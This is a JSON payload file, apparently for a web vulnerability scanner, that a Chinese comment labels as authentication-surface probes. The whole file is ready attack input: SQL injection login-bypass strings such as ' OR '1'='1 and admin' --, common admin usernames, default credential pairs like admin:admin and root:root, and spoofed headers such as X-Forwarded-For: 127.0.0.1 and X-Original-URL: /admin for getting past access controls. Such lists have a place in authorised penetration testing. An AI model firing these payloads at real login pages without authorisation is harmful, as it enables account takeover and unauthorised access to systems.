{
  "name": "auth",
  "说明": "认证面探针。登录注入属于前台未授权 SQLi 面，优先级最高。",
  "sets": {
    "login_injection": [
      "admin' --",
      "admin' #",
      "admin'/*",
      "' OR '1'='1",
      "' OR 1=1--",
      "admin\" --",
      "admin' or '1'='1' --"
    ],
    "usernames": [
      "admin",
      "administrator",
      "system",
      "test",
      "sa"
    ],
    "default_creds": [
      "admin:admin",
      "admin:admin123",
      "admin:123456",
      "admin:admin888",
      "admin:12345678",
      "root:root",
      "test:test"
    ],
    "bypass_headers": [
      "X-Forwarded-For: 127.0.0.1",
      "X-Original-URL: /admin",
      "X-Rewrite-URL: /admin",
      "X-Forwarded-Host: localhost",
      "X-Custom-IP-Authorization: 127.0.0.1"
    ]
  },
  "pairs": {}
}
